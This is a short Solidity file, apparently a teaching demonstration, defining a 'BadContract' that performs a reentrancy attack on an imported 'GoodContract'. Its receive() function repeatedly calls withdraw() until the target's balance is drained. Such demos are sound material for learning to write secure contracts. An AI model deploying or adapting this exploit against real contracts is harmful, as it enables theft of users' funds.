// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./GoodContract.sol";

contract BadContract {
    GoodContract public goodContract;

    constructor(address _goodContract) {
        goodContract = GoodContract(_goodContract);
    }

    // Override receive function to keep withdrawing while goodContract has balance
    receive() external payable {
        if (address(goodContract).balance > 0) {
            goodContract.withdraw();
        }
    }

    function attack() public payable {
        goodContract.deposit{value: msg.value}();
        goodContract.withdraw();
    }
}
